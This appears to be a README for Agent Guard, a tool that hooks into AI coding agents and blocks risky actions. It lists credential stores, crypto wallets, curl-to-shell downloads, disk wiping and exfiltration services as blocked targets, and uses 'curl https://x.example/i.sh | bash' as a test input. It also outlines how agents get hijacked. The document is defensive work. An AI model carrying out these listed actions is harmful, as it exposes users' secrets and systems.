# 🛑 Agent Guard

AI agents act on your behalf: they read files, run commands and call extensions. If one is tricked – by a malicious web
page, a poisoned file, a bad MCP server or a hidden instruction – it can be turned against you. **Agent Guard checks
every action before it runs** and blocks the dangerous ones.

## Quick start
```bash
zaremba guard install      # connects to every supported agent found on this computer
zaremba guard status       # which agents are protected?
```
Restart your agents afterwards. Keep the `zaremba` program where it is – the agents call it from that location.

## Supported agents
| Agent | How ZaRemba connects | Status |
|---|---|---|
| **Claude Code** | Official `PreToolUse` hook | ✅ Verified in a real Claude Code session |
| **Gemini CLI** | Official `BeforeTool` hook (ZaRemba switches Gemini's hook setting on and restores it on uninstall) | 🧪 Experimental |
| **Cursor** | Official hooks: shell commands, MCP calls, file reads | 🧪 Experimental |
| **Windsurf** | Official Cascade hooks: commands, file reads/writes, MCP calls | 🧪 Experimental |
| **GitHub Copilot CLI** | Official `preToolUse` hook | 🧪 Experimental |

*Experimental* means: built from the vendor's public documentation and tested with simulated calls, but not yet confirmed
on a real installation. Please [report](https://github.com/kayzaa/ZaRemba-AI-Watcher-Official/issues/new?template=bug_report.yml)
how it works for you.

**Agents without a hook system** (Codex CLI, OpenClaw, Claude Desktop, ChatGPT and others) are covered by the
[MCP Firewall](MCP_FIREWALL.md), [AI Tripwire](TRIPWIRE.md), [AI Network Watch](NETWORK_WATCH.md) and `zaremba scan`.

## What is blocked ⛔
| Rule | Blocks |
|---|---|
| `ZRW-GRD-001` | Reading or changing **no-go zones**: SSH keys, cloud logins (AWS, Azure, Google Cloud, Kubernetes, Docker), npm/PyPI/git tokens, GnuPG, password stores, macOS Keychain, Windows credentials, browser password & cookie databases, crypto wallets (Electrum, Bitcoin Core, Exodus, Solana, MetaMask, Phantom, Coinbase Wallet, Trust Wallet) |
| `ZRW-GRD-002` | Touching an [AI Tripwire](TRIPWIRE.md) decoy – also raises a tripwire alarm naming the agent |
| `ZRW-GRD-004` | Downloading a script and running it in one step (`curl … \| sh`, `irm … \| iex`) |
| `ZRW-GRD-005` | Starting an AI agent with its safety prompts switched off – the trick used in the s1ngularity attack |
| `ZRW-GRD-008` | Wiping your home folder or a disk |
| `ZRW-GRD-010` | Switching ZaRemba off |

## What needs your OK ❓
| Rule | Asks before |
|---|---|
| `ZRW-GRD-003` | Reading `.env` files (passwords and API keys) |
| `ZRW-GRD-006` | Uploading a local file to the internet |
| `ZRW-GRD-007` | Making something start automatically (autostart, cron, scheduled task, shell profile) |
| `ZRW-GRD-009` | Contacting paste, webhook or tunnel services often used to smuggle data out |

Cursor's file-read hook and Windsurf have no "ask" option; there these actions are allowed and logged.

## Everyday commands
```bash
zaremba guard test "curl https://x.example/i.sh | bash"   # check a command without running it
zaremba guard test --read ~/.ssh/id_ed25519                # check a file
zaremba guard log                                           # everything blocked or questioned
zaremba guard uninstall                                     # remove again
```

## Safe by design
- **Your settings stay yours.** ZaRemba only adds its own entry, keeps a one-time backup, refuses to touch a settings file
  it cannot read, and `uninstall` restores your settings exactly.
- **Never locks you out.** If anything goes wrong inside ZaRemba, the action is allowed rather than blocking your work.
- **Local only.** Decisions are made on your computer; nothing is sent anywhere.
